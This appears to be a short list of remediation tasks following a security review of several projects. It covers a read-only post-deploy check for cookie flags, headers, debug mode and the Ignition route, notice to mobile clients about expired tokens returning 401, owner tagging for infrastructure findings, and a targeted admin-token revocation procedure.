- Write and wire post-deploy-security-check.sh per project (PHASE-6.7-smoke): read-only probes for the Secure cookie flag, the header set, /health's shape, APP_DEBUG behaviour and the _ignition 404. composer qa, yarn type-check and the build all pass whether or not any of these are true. Allowlist the CI runner against the per-IP limiters or keep the probe count small.

- Tell the mobile lead of 122-gfeai-v2, 127-tourise, 128-pif-psf-2026 and 129-pif-gamf that expired tokens will start returning 401, and get written confirmation the client implements the 401-to-OTP handler its own contract documents, BEFORE the PHASE-0 deploy (P0.14). Also ask the PHASE-3/OQ-flutter question: does any mobile client render a guest status name as HTML.

- Adopt the [CODE]/[OPS]/[DECISION]/[TRIAGE] tagging and give every infrastructure item a named owner (M05+PHASE-6-OPS). Four of six Mediums in pep were infrastructure, none of which appears in a pull request, and without an owner they are silently dropped between a fix and a retest. Add a credential-rotation procedure that explicitly revokes personal_access_tokens rows scoped to the specific admin id — never truncating the table, which would drop a gate operator mid-event (PHASE-6.5).
